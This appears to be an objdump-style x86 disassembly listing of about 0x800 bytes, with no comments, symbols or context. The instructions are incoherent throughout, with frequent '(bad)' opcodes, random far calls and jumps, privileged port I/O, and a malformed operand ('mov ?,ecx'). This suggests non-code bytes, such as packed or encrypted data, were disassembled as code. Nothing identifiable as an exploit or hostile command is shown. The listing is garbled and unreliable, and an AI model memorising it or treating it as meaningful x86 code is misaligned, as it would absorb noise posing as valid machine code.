  412775:	and    BYTE PTR [ebx+0x6e5d2820],cl
  41277b:	cmp    eax,0x8a287627
  412780:	adc    esp,DWORD PTR [ebx]
  412782:	loop   0x41274a
  412784:	loope  0x412794
  412786:	pop    ds
  412787:	mov    dh,BYTE PTR [eax+0x5d16d89c]
  41278d:	or     ebx,esp
  41278f:	into   
  412790:	(bad)  
  412791:	aas    
  412792:	sbb    DWORD PTR [esi-0x3],eax
  412795:	addr16 mov bl,0x7c
  412798:	and    DWORD PTR [ebx-0x6f],esi
  41279b:	dec    esp
  41279c:	popf   
  41279d:	js     0x4127cc
  41279f:	jbe    0x412777
  4127a1:	cmp    al,0xdd
  4127a3:	inc    esp
  4127a4:	mov    bl,0xf1
  4127a6:	and    eax,0xe77e816c
  4127ab:	retf   0x10d0
  4127ae:	or     DWORD PTR [edx],0xe15b98e1
  4127b4:	inc    ebx
  4127b5:	add    ch,BYTE PTR ds:0xb2c5199f
  4127bb:	cmp    edi,DWORD PTR [ebx+ebp*2-0x4a2ee636]
  4127c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c3:	aaa    
  4127c4:	xor    ecx,DWORD PTR [eax+0x4ca9ffcd]
  4127ca:	mov    ?,ecx
  4127cc:	and    BYTE PTR [ebx],0x9b
  4127cf:	or     al,0x59
  4127d1:	out    dx,eax
  4127d2:	gs dec eax
  4127d4:	jmp    0xd062:0x85c041ec
  4127db:	adc    eax,0xb6d9b89b
  4127e0:	push   ds
  4127e1:	out    0x37,eax
  4127e3:	loop   0x412801
  4127e5:	or     al,0xbe
  4127e7:	pop    ds
  4127e8:	push   ebx
  4127e9:	outs   dx,BYTE PTR ds:[esi]
  4127eb:	ins    DWORD PTR es:[edi],dx
  4127ec:	xchg   esi,eax
  4127ed:	jb     0x41277f
  4127ef:	cmp    bl,BYTE PTR [esi+0x3c2f573b]
  4127f5:	jmp    0x41277a
  4127f7:	xchg   edi,eax
  4127f8:	int    0xcb
  4127fa:	aas    
  4127fb:	int    0xad
  4127fd:	sbb    al,0xdc
  4127ff:	cmp    eax,0xbdbc5242
  412804:	inc    ebx
  412805:	call   FWORD PTR [ebp+0x7183ba50]
  41280b:	cli    
  41280c:	(bad)  
  41280d:	out    dx,al
  41280e:	sti    
  41280f:	and    eax,0x8b12d8c7
  412814:	or     ebp,esp
  412816:	push   ds
  412817:	inc    esp
  412818:	jecxz  0x412800
  41281a:	jge    0x4127c7
  41281c:	jb     0x4127a0
  41281e:	push   ebx
  41281f:	push   edx
  412820:	outs   dx,BYTE PTR ds:[esi]
  412821:	lds    esp,FWORD PTR [eax+0x5563055c]
  412827:	xor    ecx,DWORD PTR [ebp-0x68]
  41282a:	xchg   ebx,eax
  41282b:	fimul  WORD PTR [eax+0x4d]
  41282e:	add    DWORD PTR [edi],eax
  412830:	cmp    DWORD PTR [ebp-0x7],esi
  412833:	shl    bl,1
  412835:	scas   eax,DWORD PTR es:[edi]
  412836:	les    edi,FWORD PTR [esi+0x1b]
  412839:	push   es
  41283a:	test   al,0x9b
  41283c:	adc    eax,0xcdd089a3
  412841:	jne    0x4127ce
  412843:	xchg   esi,eax
  412844:	scas   eax,DWORD PTR es:[edi]
  412845:	mov    ds:0xd2bd29,eax
  41284a:	(bad)  
  41284b:	fnstsw WORD PTR [ecx+0x37]
  41284e:	dec    ebp
  41284f:	mov    ds:0xa309cd6,eax
  412854:	rcr    DWORD PTR [ebx-0x555ca435],1
  41285a:	addr16 sbb eax,0xda1e7df8
  412860:	adc    eax,0xf80cba5
  412865:	arpl   WORD PTR [esp+ecx*2+0x30],bp
  412869:	cmp    DWORD PTR [eax-0x3d],eax
  41286c:	sub    al,0x43
  41286e:	or     ebp,ebx
  412870:	out    0x32,al
  412872:	ficomp WORD PTR [ecx-0x7e]
  412875:	dec    edx
  412876:	or     bh,BYTE PTR [ecx-0x33]
  412879:	imul   esi,DWORD PTR [ebp+0x41],0x5
  41287d:	jmp    0xf6654a78
  412882:	shl    BYTE PTR [edx],0x69
  412885:	sub    al,al
  412887:	adc    DWORD PTR [ebx-0x71919e69],esi
  41288d:	xor    al,0x30
  41288f:	test   BYTE PTR [esi+0x778b1156],0x17
  412896:	retf   0x5114
  412899:	mov    esi,0x356d62a9
  41289e:	pop    eax
  41289f:	jae    0x412858
  4128a1:	call   0x8494:0xf308d1ac
  4128a8:	inc    edi
  4128a9:	shr    DWORD PTR ds:0x50273fbc,0xa0
  4128b0:	nop
  4128b1:	push   ebp
  4128b2:	xchg   BYTE PTR [ebx-0x3c98f9fe],bl
  4128b8:	and    esp,DWORD PTR [ebp+0x15]
  4128bb:	or     al,0xa2
  4128bd:	mov    bl,0xf0
  4128bf:	ret    0xdc94
  4128c2:	push   0x46ab4873
  4128c7:	ficom  WORD PTR [ecx-0x1c68d282]
  4128cd:	jno    0xba2d5e3d
  4128d3:	jo     0x41291e
  4128d5:	jle    0x412908
  4128d7:	not    ebx
  4128d9:	nop
  4128da:	jo     0x41294e
  4128dc:	mov    ah,0xc2
  4128de:	call   0x18ce:0x86380f80
  4128e5:	jg     0x41289b
  4128e7:	dec    esp
  4128e8:	fs push ds
  4128ea:	call   FWORD PTR [esi-0x11]
  4128ed:	scas   al,BYTE PTR es:[edi]
  4128ee:	add    dl,BYTE PTR [esi+0x64]
  4128f1:	sbb    ecx,esi
  4128f3:	js     0x4128a6
  4128f5:	icebp  
  4128f6:	inc    edi
  4128f7:	aas    
  4128f8:	xchg   edi,eax
  4128f9:	(bad)  
  4128fa:	mov    ds:0xd5367b74,eax
  4128ff:	jo     0x412882
  412901:	test   ah,cl
  412903:	xor    al,BYTE PTR [esi+0x40739f76]
  412909:	scas   al,BYTE PTR es:[edi]
  41290a:	jp     0x4128d6
  41290c:	call   0xc307:0x46655315
  412913:	cmp    DWORD PTR [edi+0x3ab50eda],0x49b52f3b
  41291d:	xor    DWORD PTR [edi+0x524f6641],edx
  412923:	fisttp QWORD PTR [edi+0x7c0fe6ff]
  412929:	(bad)  
  41292b:	sti    
  41292c:	in     al,dx
  41292d:	xor    edi,DWORD PTR [ecx+ebx*1]
  412930:	push   esp
  412931:	popf   
  412932:	add    al,0xf9
  412934:	adc    DWORD PTR [ebx],edi
  412936:	jl     0x4128c2
  412938:	lock cmp DWORD PTR [eax+0x4c782dab],ebx
  41293f:	jmp    DWORD PTR [eax+0x354d3868]
  412945:	dec    ecx
  412946:	push   ebp
  412947:	retf   
  412948:	mov    ecx,0xdd628df5
  41294d:	inc    edx
  41294e:	lods   al,BYTE PTR ds:[esi]
  41294f:	push   edx
  412950:	mov    DWORD PTR [eax+0x2021abf7],edx
  412956:	ins    DWORD PTR es:[edi],dx
  412957:	in     al,0x8e
  412959:	jo     0x4128e4
  41295b:	sbb    ecx,DWORD PTR [edi]
  41295d:	data16 jnp 0x4128e5
  412960:	inc    eax
  412961:	and    eax,0x292871d6
  412966:	int3   
  412967:	sbb    al,0x22
  412969:	adc    esi,DWORD PTR [esi-0x7a]
  41296c:	das    
  41296d:	fwait
  41296e:	inc    eax
  41296f:	or     DWORD PTR [ebx+0x79],ebp
  412972:	daa    
  412973:	mov    bh,0x24
  412975:	inc    esi
  412976:	jmp    0x742b93a0
  41297b:	cmp    ah,BYTE PTR [edi+0x7ded1fe7]
  412981:	in     al,dx
  412982:	xor    BYTE PTR [edi-0x184fb854],ah
  412988:	and    eax,DWORD PTR [ebp-0x7c9381bf]
  41298e:	mov    ebp,0xe30e60de
  412993:	sub    ecx,0x1c
  412996:	cli    
  412997:	xchg   ecx,eax
  412998:	xchg   BYTE PTR [ebp+0xfd12c2c],bh
  41299e:	pop    ss
  41299f:	call   0x3251:0xe40d77d6
  4129a6:	ds leave 
  4129a8:	cmp    dh,al
  4129aa:	and    ebx,DWORD PTR [esi+0x47]
  4129ad:	int3   
  4129ae:	mov    esi,0x17bf3381
  4129b3:	xor    DWORD PTR [edx-0x1e32dc2f],esi
  4129b9:	lods   eax,DWORD PTR ds:[esi]
  4129ba:	gs aaa 
  4129bc:	cld    
  4129bd:	sar    esi,cl
  4129bf:	sbb    DWORD PTR [esi],0x8ac61334
  4129c5:	dec    ecx
  4129c6:	pop    edi
  4129c7:	push   edx
  4129c8:	xchg   esp,eax
  4129c9:	mov    ebp,0x5ae4d263
  4129ce:	adc    al,BYTE PTR [eax-0x2b]
  4129d1:	adc    bl,BYTE PTR [edx-0xe]
  4129d4:	inc    esi
  4129d5:	add    eax,0x69502172
  4129da:	call   0x55f1:0x4f99b013
  4129e1:	adc    eax,0xb9d41e9b
  4129e6:	sub    eax,0x4e425535
  4129eb:	add    bl,ah
  4129ed:	xchg   edx,eax
  4129ee:	pop    DWORD PTR [edx-0x28caeea0]
  4129f4:	inc    esp
  4129f5:	pop    ds
  4129f6:	lods   al,BYTE PTR ds:[esi]
  4129f7:	adc    eax,DWORD PTR [edi+0x39b26636]
  4129fd:	cmp    ecx,ebp
  4129ff:	adc    esp,DWORD PTR [edx]
  412a01:	mov    al,0xe9
  412a03:	sbb    ecx,DWORD PTR [ebp+0x7d67dc65]
  412a09:	(bad)  
  412a0a:	xchg   edi,eax
  412a0b:	push   es
  412a0c:	cmc    
  412a0d:	in     eax,0x5b
  412a0f:	adc    dl,BYTE PTR [ebp+0x62]
  412a12:	dec    ebp
  412a13:	test   DWORD PTR [ecx-0x36],eax
  412a16:	daa    
  412a17:	dec    edx
  412a18:	ficomp WORD PTR [eax]
  412a1a:	popa   
  412a1b:	mov    ebx,0x6638e3c5
  412a20:	cdq    
  412a21:	jp     0x4129cf
  412a23:	leave  
  412a24:	pop    esp
  412a25:	push   esi
  412a26:	call   0x96a5:0x91b09d3d
  412a2d:	addr16 push esp
  412a2f:	inc    DWORD PTR [ebp+0x68c60aec]
  412a35:	xchg   ebx,eax
  412a36:	stos   BYTE PTR es:[edi],al
  412a37:	add    DWORD PTR [esi-0x7a7faf4d],edx
  412a3d:	(bad)  
  412a3f:	push   ecx
  412a40:	jne    0x4129e7
  412a42:	jmp    0x412a0c
  412a44:	mov    al,ds:0x81c17408
  412a49:	push   edi
  412a4a:	call   0xdc44:0x38416461
  412a51:	dec    esi
  412a52:	adc    bh,BYTE PTR [ebp-0x62]
  412a55:	adc    ecx,DWORD PTR [eax-0x6d]
  412a58:	sub    BYTE PTR [edx],bh
  412a5a:	dec    ebx
  412a5b:	mov    ecx,DWORD PTR [ebx]
  412a5d:	ins    DWORD PTR es:[edi],dx
  412a5e:	loopne 0x412a08
  412a60:	aad    0xa5
  412a62:	inc    ecx
  412a63:	outs   dx,DWORD PTR ds:[esi]
  412a64:	push   ebx
  412a65:	lods   al,BYTE PTR ds:[esi]
  412a66:	sub    edi,ebp
  412a68:	mov    ah,0x5a
  412a6a:	add    ah,ah
  412a6c:	mov    esp,0xc041228b
  412a71:	push   cs
  412a72:	pop    ebp
  412a73:	test   esi,edx
  412a75:	add    bl,BYTE PTR [ebx+esi*4+0x123f93f8]
  412a7c:	dec    ecx
  412a7d:	adc    BYTE PTR [esi],bh
  412a7f:	and    ecx,DWORD PTR [esi+edi*1-0x6c]
  412a83:	arpl   WORD PTR [edi-0x3cddcd08],sp
  412a89:	jle    0x412a42
  412a8b:	test   DWORD PTR [eax],esi
  412a8d:	mov    esp,0xa21b1ecb
  412a92:	ror    BYTE PTR [edx-0x6eaad559],cl
  412a98:	xlat   BYTE PTR ds:[ebx]
  412a99:	imul   esp,DWORD PTR [edx-0x15ee375],0xcb269644
  412aa3:	pop    eax
  412aa4:	pusha  
  412aa5:	(bad)  
  412aa6:	xchg   ecx,eax
  412aa7:	pop    edi
  412aa8:	dec    esp
  412aa9:	pop    ecx
  412aaa:	adc    DWORD PTR [edi+0x5a7f2cc1],ecx
  412ab0:	(bad)  
  412ab1:	in     al,0x73
  412ab3:	fild   QWORD PTR [ecx+0xdebf294]
  412ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aba:	adc    bh,BYTE PTR [ecx]
  412abc:	xchg   BYTE PTR [ebp+0x48],dl
  412abf:	adc    DWORD PTR [ebp-0x94f87a9],esp
  412ac5:	sbb    cl,al
  412ac7:	fsub   DWORD PTR [edx-0x21]
  412aca:	stos   DWORD PTR es:[edi],eax
  412acb:	sub    ebp,DWORD PTR [eax]
  412acd:	stos   DWORD PTR es:[edi],eax
  412ace:	das    
  412acf:	shl    DWORD PTR [edx+eax*1+0x4ca17888],cl
  412ad6:	jbe    0x412ac1
  412ad8:	bound  edx,QWORD PTR [ebx+0x58760d10]
  412ade:	mov    dh,0xb
  412ae0:	or     esi,DWORD PTR [eax+0x2575fdbe]
  412ae6:	retf   
  412ae7:	daa    
  412ae8:	adc    DWORD PTR [ebx],ecx
  412aea:	dec    esp
  412aeb:	or     bl,bh
  412aed:	xor    al,0xa1
  412aef:	add    eax,0xb7fcd613
  412af4:	sbb    eax,0xaea87570
  412af9:	fwait
  412afa:	in     eax,0x3a
  412afc:	test   DWORD PTR [ecx],0xd815c15c
  412b02:	jmp    0x412b68
  412b04:	push   0x49
  412b06:	xchg   edx,eax
  412b07:	push   0x43878e6f
  412b0c:	js     0x412b17
  412b0e:	aad    0x6e
  412b10:	imul   DWORD PTR [esi+0x78045833]
  412b16:	xchg   BYTE PTR fs:[ebx+0x305dabc5],ah
  412b1d:	enter  0xb740,0xb5
  412b21:	xchg   ebx,eax
  412b22:	xchg   ecx,eax
  412b23:	repnz rcl DWORD PTR [eax+ecx*2-0x6c22070f],0x56
  412b2c:	ds int 0xee
  412b2f:	xchg   esp,eax
  412b30:	or     BYTE PTR [ebp+0x115ca9e2],0xd9
  412b37:	sbb    BYTE PTR [edi-0x46bfb94],dh
  412b3d:	jne    0x412b11
  412b3f:	inc    esi
  412b40:	push   DWORD PTR [ebx-0x2b527f91]
  412b46:	xor    al,0x75
  412b48:	or     al,0xaa
  412b4a:	xor    al,0x38
  412b4c:	xor    DWORD PTR [esi],esp
  412b4e:	pop    ebp
  412b4f:	adc    ah,BYTE PTR ds:0x6d60d1b8
  412b55:	repz test DWORD PTR [esi],ecx
  412b58:	(bad)  
  412b59:	dec    eax
  412b5a:	jmp    0x412bb8
  412b5c:	xlat   BYTE PTR ds:[ebx]
  412b5d:	lock push 0x38b83633
  412b63:	les    ebp,FWORD PTR [ebp+0x57]
  412b66:	loopne 0x412b4a
  412b68:	cdq    
  412b69:	cmp    dl,BYTE PTR [edx]
  412b6b:	fwait
  412b6c:	pusha  
  412b6d:	push   ecx
  412b6e:	fsub   QWORD PTR [edx+ecx*4]
  412b71:	adc    dh,BYTE PTR [esi+0x57]
  412b74:	ins    DWORD PTR es:[edi],dx
  412b75:	jmp    0x2cccc3bc
  412b7a:	mov    ebx,0x5cb307ec
  412b7f:	sub    al,0x93
  412b81:	stc    
  412b82:	pop    esp
  412b83:	lock aaa 
  412b85:	aam    0x3d
  412b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b88:	(bad)  
  412b89:	aad    0x2d
  412b8b:	fwait
  412b8c:	(bad)  
  412b8d:	mov    eax,0xba82e75b
  412b92:	test   al,0x5d
  412b94:	jge    0x412bec
  412b96:	sub    BYTE PTR [ebp-0x76],al
  412b99:	test   DWORD PTR [ecx+0xc6d0388],edx
  412b9f:	adc    esp,esp
  412ba1:	adc    BYTE PTR [eax-0x2d],ah
  412ba4:	dec    eax
  412ba5:	mov    BYTE PTR [ecx+0x11d255a3],dh
  412bab:	xlat   BYTE PTR ds:[ebx]
  412bac:	push   edx
  412bad:	sbb    eax,0xd0ce437b
  412bb2:	mov    ebx,0xe7c37705
  412bb7:	sub    eax,0x1291bed6
  412bbc:	xlat   BYTE PTR ds:[ebx]
  412bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbe:	push   edx
  412bbf:	imul   esi,DWORD PTR [ebx+esi*1-0x54],0x5cc1426
  412bc7:	dec    edi
  412bc8:	inc    edi
  412bc9:	xor    DWORD PTR [edx+0x41],eax
  412bcc:	mov    dh,0x4a
  412bce:	lods   al,BYTE PTR ds:[esi]
  412bcf:	std    
  412bd0:	cmp    esi,esp
  412bd2:	das    
  412bd3:	push   es
  412bd4:	ror    al,cl
  412bd6:	jmp    0x412b8c
  412bd8:	loop   0x412c1f
  412bda:	sbb    al,0x19
  412bdc:	stos   DWORD PTR es:[edi],eax
  412bdd:	add    BYTE PTR [ebx+0xfd9bdaa],dl
  412be3:	ror    DWORD PTR [esi+0x2d8f7f8c],cl
  412be9:	and    eax,DWORD PTR [edi]
  412beb:	cli    
  412bec:	inc    esp
  412bed:	sub    eax,0x531e3d16
  412bf2:	mov    ch,0xdd
  412bf4:	push   es
  412bf5:	sub    al,BYTE PTR [esi+0x3e7885e2]
  412bfb:	cmp    al,0xde
  412bfd:	or     BYTE PTR [ebx-0x80],dh
  412c00:	test   al,0x1e
  412c02:	pop    ss
  412c03:	mov    eax,ds:0x212161fb
  412c08:	cmp    ch,0x50
  412c0b:	sbb    DWORD PTR [ecx],ecx
  412c0d:	inc    ebp
  412c0e:	js     0x412c8c
  412c10:	in     al,0x10
  412c12:	adc    al,BYTE PTR [eax-0x5502e62e]
  412c18:	mov    edi,0x2b809ad3
  412c1d:	daa    
  412c1e:	push   ebp
  412c1f:	pop    esi
  412c20:	ins    DWORD PTR es:[edi],dx
  412c21:	lods   eax,DWORD PTR ds:[esi]
  412c22:	push   ds
  412c23:	add    BYTE PTR [edi-0x4b6aa937],bh
  412c29:	dec    esi
  412c2a:	sub    esp,DWORD PTR [edi-0x76]
  412c2d:	mov    fs,WORD PTR [eax-0x36]
  412c30:	(bad)  
  412c31:	scas   eax,DWORD PTR es:[edi]
  412c32:	pushf  
  412c33:	push   0x53
  412c35:	inc    ebx
  412c36:	cmc    
  412c37:	jne    0x412c49
  412c39:	dec    eax
  412c3a:	push   0xffffffae
  412c3c:	scas   al,BYTE PTR es:[edi]
  412c3d:	and    ecx,0x36
  412c40:	mov    DWORD PTR [ebx],0xc85337b7
  412c46:	push   0xffffffb1
  412c48:	fcomp  DWORD PTR [ebp-0x1b424ca3]
  412c4e:	rol    DWORD PTR [ebx+ebp*2-0x2a],0xda
  412c53:	fdiv   QWORD PTR [ebx-0x44bf7d24]
  412c59:	xchg   edx,eax
  412c5a:	std    
  412c5b:	sub    BYTE PTR [edx+0x46deb17],0x1
  412c62:	adc    DWORD PTR ds:0xe21f0ffe,eax
  412c68:	loopne 0x412c34
  412c6a:	xchg   ecx,eax
  412c6b:	sub    DWORD PTR [edx-0x22d7b5d9],ebp
  412c71:	adc    ecx,esi
  412c73:	lahf   
  412c74:	fist   DWORD PTR [ecx]
  412c76:	pop    ebx
  412c77:	aad    0x45
  412c79:	out    dx,al
  412c7a:	push   edx
  412c7b:	push   eax
  412c7d:	repnz xlat BYTE PTR fs:[ebx]
  412c80:	inc    ebx
  412c81:	jle    0x412cfe
  412c83:	shl    ebx,0x79
  412c86:	pcmpgtw mm6,QWORD PTR [edx]
  412c89:	pop    esp
  412c8a:	mov    al,0xb0
  412c8c:	stos   BYTE PTR es:[edi],al
  412c8d:	mov    ebp,0x33153929
  412c92:	adc    eax,0xbc2de414
  412c97:	jmp    0x2d1:0xebaf9365
  412c9e:	adc    dl,dl
  412ca0:	mov    al,ds:0x3f34a9ef
  412ca5:	mov    edx,0xb47be7a3
  412caa:	xchg   edx,eax
  412cab:	and    BYTE PTR [ebp-0x5d43a876],bh
  412cb1:	les    esp,FWORD PTR [ebx+0x54]
  412cb4:	xor    eax,0xdce67177
  412cb9:	mov    ah,0x4a
  412cbb:	add    BYTE PTR [edx+0x52],0x22
  412cbf:	inc    ebx
  412cc0:	adc    eax,0xf8996919
  412cc5:	inc    esp
  412cc6:	lahf   
  412cc7:	call   0x47c7:0xf4dcdc9d
  412cce:	stos   DWORD PTR es:[edi],eax
  412ccf:	cmp    edx,edx
  412cd1:	(bad)  
  412cd2:	fistp  DWORD PTR [edi-0x6cbf69fe]
  412cd8:	dec    esi
  412cd9:	leave  
  412cda:	sar    ebp,1
  412cdc:	jns    0x412d41
  412cde:	cmp    ebx,DWORD PTR [edx-0x9b0e55a]
  412ce4:	inc    ebp
  412ce5:	out    0x3c,eax
  412ce7:	mov    eax,ds:0xc0c0cf4a
  412cec:	pop    DWORD PTR [edi+0x45828b8a]
  412cf2:	cmp    esi,DWORD PTR [ebx]
  412cf4:	jmp    0xcab49b23
  412cf9:	test   BYTE PTR [eax-0x4d],0x4f
  412cfd:	in     eax,0x7
  412cff:	sar    ch,cl
  412d01:	push   0x78
  412d03:	push   0xd64d014b
  412d08:	icebp  
  412d09:	(bad)  [eax-0x5b]
  412d0c:	mov    edx,0xb0725eff
  412d11:	nop
  412d12:	test   eax,0xd647a83a
  412d17:	mov    ch,0xbe
  412d19:	jnp    0x412d47
  412d1b:	pop    es
  412d1c:	jp     0x412cbf
  412d1e:	cmp    esi,DWORD PTR [edi-0x15451b14]
  412d24:	test   al,0x90
  412d26:	push   0x50
  412d28:	or     eax,0xf822fc38
  412d2d:	sbb    DWORD PTR ds:0x19bdd044,0x55
  412d34:	outs   dx,DWORD PTR ds:[esi]
  412d35:	or     BYTE PTR [esi],al
  412d37:	je     0x412d0d
  412d39:	rcl    BYTE PTR [esi-0x57],0x9f
  412d3d:	lock dec edx
  412d3f:	dec    ebp
  412d40:	mov    bl,0x34
  412d42:	idiv   BYTE PTR [edx]
  412d44:	mov    cl,0x2f
  412d46:	xchg   esp,eax
  412d47:	test   eax,0x927a086f
  412d4c:	punpckhdq mm4,QWORD PTR [esi-0x36]
  412d50:	cmp    BYTE PTR [eax-0x77],dl
  412d53:	push   ecx
  412d54:	ins    DWORD PTR es:[edi],dx
  412d55:	fisttp WORD PTR [esi-0x217d89a]
  412d5b:	sahf   
  412d5c:	fs cs cmp al,0x95
  412d60:	stc    
  412d61:	les    esp,FWORD PTR [edx-0x21]
  412d64:	push   ecx
  412d65:	jae    0x412dcc
  412d67:	pushfw 
  412d69:	sar    bh,1
  412d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6c:	xchg   BYTE PTR [ecx+ecx*1],ah
  412d6f:	xor    al,BYTE PTR [esp+ebp*2-0x4c42bab4]
  412d76:	mov    ds:0xa9f5b9d8,eax
  412d7b:	mov    ah,0xd
  412d7d:	ror    DWORD PTR [edi-0x4d150104],cl
  412d83:	test   al,0x9a
  412d85:	je     0x412d3e
  412d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d88:	mov    dh,0x60
  412d8a:	mov    cl,0xfe
  412d8c:	mov    al,dl
  412d8e:	and    edi,DWORD PTR [ebp+0x60c32222]
  412d94:	out    dx,eax
  412d95:	aad    0x5d
  412d97:	test   al,0x44
  412d99:	push   esp
  412d9a:	fidivr WORD PTR [esi+0x27]
  412d9d:	ja     0x412d2c
  412d9f:	lea    ebx,[esi]
  412da1:	imul   ebp,DWORD PTR [ebx+edi*2],0xfffffff9
  412da5:	mov    ss,esi
  412da7:	test   bl,cl
  412da9:	push   esi
  412daa:	sar    BYTE PTR [esi+0x2c],cl
  412dad:	dec    ebx
  412dae:	dec    eax
  412daf:	imul   eax,DWORD PTR [ebp+0x1e],0x198c8c57
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	xchg   ebp,eax
  412db8:	aad    0x94
  412dba:	dec    ebp
  412dbb:	pop    eax
  412dbc:	inc    esp
  412dbd:	fcmovnbe st,st(0)
  412dbf:	push   es
  412dc0:	sub    ecx,edx
  412dc2:	ss or  eax,0x45a69935
  412dc8:	mov    ss,WORD PTR [ecx]
  412dca:	and    ebp,DWORD PTR [eax]
  412dcc:	mov    ds:0x7d26356b,al
  412dd1:	inc    ecx
  412dd2:	add    al,0xf2
  412dd4:	xchg   ebp,eax
  412dd5:	fld    TBYTE PTR [eax-0x54]
  412dd8:	pop    ds
  412dd9:	in     eax,dx
  412dda:	das    
  412ddb:	(bad)  [ebp-0x557de454]
  412de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412de2:	aam    0xf9
  412de4:	stos   DWORD PTR es:[edi],eax
  412de5:	rcr    BYTE PTR ds:[ebp-0x1685b9cb],1
  412dec:	mov    ecx,0xd97b95f2
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	ficomp DWORD PTR [esi]
  412df4:	inc    ecx
  412df5:	mov    ah,0x87
  412df7:	or     eax,0xdc79a099
  412dfc:	pop    ebp
  412dfd:	jp     0x412d8a
  412dff:	outs   dx,BYTE PTR ds:[esi]
  412e00:	jae    0x412dee
  412e02:	push   ds
  412e03:	clc    
  412e04:	pop    esi
  412e05:	and    eax,0xbe8349c3
  412e0a:	cmp    DWORD PTR [ecx+0x71],esi
  412e0d:	mov    ds:0x6020c2f4,al
  412e12:	add    DWORD PTR [eax+0xf],0x42e24e99
  412e19:	xor    dh,bl
  412e1b:	retf   
  412e1c:	fdiv   QWORD PTR [eax]
  412e1e:	push   es
  412e1f:	adc    al,0x71
  412e21:	xchg   ecx,eax
  412e22:	pop    es
  412e23:	ins    DWORD PTR es:[edi],dx
  412e24:	mov    bh,0x1d
  412e26:	push   esp
  412e27:	shl    BYTE PTR [ecx+0x51],cl
  412e2a:	int    0x19
  412e2c:	aaa    
  412e2d:	pop    ecx
  412e2e:	mov    al,0xc6
  412e30:	mov    ds:0x29107ab2,al
  412e35:	xchg   DWORD PTR [ecx],esp
  412e37:	mov    bh,BYTE PTR [ebp+0x3d]
  412e3a:	inc    edi
  412e3b:	cmp    DWORD PTR [edx+0x6cff5e19],edi
  412e41:	daa    
  412e42:	jecxz  0x412e3a
  412e44:	push   edx
  412e45:	js     0x412e60
  412e47:	push   ds
  412e48:	xor    al,0xcd
  412e4a:	(bad)  
  412e4b:	pushf  
  412e4c:	scas   eax,DWORD PTR es:[edi]
  412e4d:	mov    BYTE PTR [ebx-0x21],cl
  412e50:	jnp    0x412e81
  412e52:	icebp  
  412e53:	sti    
  412e54:	dec    DWORD PTR [esi]
  412e56:	fnsave [eax]
  412e58:	lock cmp BYTE PTR [ebp-0x60bbac92],ch
  412e5f:	mov    edx,ebp
  412e61:	dec    edx
  412e62:	mov    dl,al
  412e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e65:	loop   0x412e21
  412e67:	lods   al,BYTE PTR ds:[esi]
  412e68:	leave  
  412e69:	jae    0x412ecd
  412e6b:	(bad)  
  412e6c:	ins    DWORD PTR es:[edi],dx
  412e6d:	ror    ebx,1
  412e6f:	repnz add al,0x83
  412e72:	icebp  
  412e73:	int3   
  412e74:	rol    DWORD PTR [edi],cl
  412e76:	mov    ds:0x548b8c74,al
  412e7b:	jns    0x412ebe
  412e7d:	sub    BYTE PTR [eax+0x2b985eb9],0xae
  412e84:	neg    DWORD PTR [esi+0x7c9f5e8b]
  412e8a:	xor    eax,0x932c89b6
  412e8f:	retf   
  412e90:	pop    ebp
  412e91:	adc    al,0xd1
  412e93:	mov    DWORD PTR [ecx],edx
  412e95:	or     al,0x63
  412e97:	in     al,0xcc
  412e99:	lea    eax,[esp+ebx*1]
  412e9c:	mov    esp,0xb3c1c919
  412ea1:	push   ebp
  412ea2:	jo     0x412e92
  412ea4:	enter  0x1a29,0xff
  412ea8:	call   0xe8c9efc4
  412ead:	dec    ebp
  412eae:	jp     0x412e74
  412eb0:	jae    0x412ea7
  412eb2:	jb     0x412f0e
  412eb4:	jmp    0x2ee11a5d
  412eb9:	fwait
  412eba:	scas   eax,DWORD PTR es:[edi]
  412ebb:	test   DWORD PTR [ebx-0x71dbb472],esi
  412ec1:	aas    
  412ec2:	xchg   DWORD PTR ds:0xdbbbed2c,esi
  412ec8:	and    al,dl
  412eca:	sbb    BYTE PTR cs:[edi-0x20],dl
  412ece:	arpl   WORD PTR [ebx],si
  412ed0:	add    al,al
  412ed2:	dec    ebp
  412ed3:	dec    ecx
  412ed4:	or     bl,BYTE PTR [ebx+ecx*4]
  412ed7:	adc    eax,0xa9f75c42
  412edc:	jecxz  0x412f59
  412ede:	(bad)  
  412edf:	sbb    ebx,eax
  412ee1:	jmp    0x412eab
  412ee3:	jnp    0x412e8c
  412ee5:	mov    esp,0x73bcb774
  412eea:	sti    
  412eeb:	retf   0x752f
  412eee:	jp     0x412f54
  412ef0:	push   0x4f
  412ef2:	lods   al,BYTE PTR ds:[esi]
  412ef3:	sub    ebx,DWORD PTR [edx]
  412ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef6:	shr    cl,cl
  412ef8:	cmp    DWORD PTR [ebx+ebx*2+0x2c1d0585],ebp
  412eff:	xchg   BYTE PTR ds:0xa68f5463,ch
  412f05:	jmp    0x412f71
  412f07:	jo     0x412ef2
  412f09:	or     esp,DWORD PTR [eax-0x2f]
  412f0c:	cmp    DWORD PTR [edx+eiz*2],esp
  412f0f:	lahf   
  412f10:	blcmsk esi,ecx
  412f15:	push   es
  412f16:	fcom   st(4)
  412f18:	js     0x412eb5
  412f1a:	ss popf 
  412f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f1d:	ja     0x412f96
  412f1f:	add    ah,cl
  412f21:	sbb    dl,BYTE PTR [esi+0x552009dc]
  412f27:	inc    eax
  412f28:	je     0x412f1e
  412f2a:	cmp    ebp,ebx
  412f2c:	mov    cx,0x6362
  412f30:	sbb    eax,0xf1db0574
  412f35:	dec    esp
  412f36:	lock dec ebx
  412f38:	jnp    0x412f77
  412f3a:	push   esp
  412f3b:	int    0x23
  412f3d:	cmp    BYTE PTR [ecx+0x1b],0x25
  412f41:	(bad)  
  412f42:	jae    0x412fbb
  412f44:	lods   al,BYTE PTR ds:[esi]
  412f45:	xchg   BYTE PTR [ebp+0x6f],bl
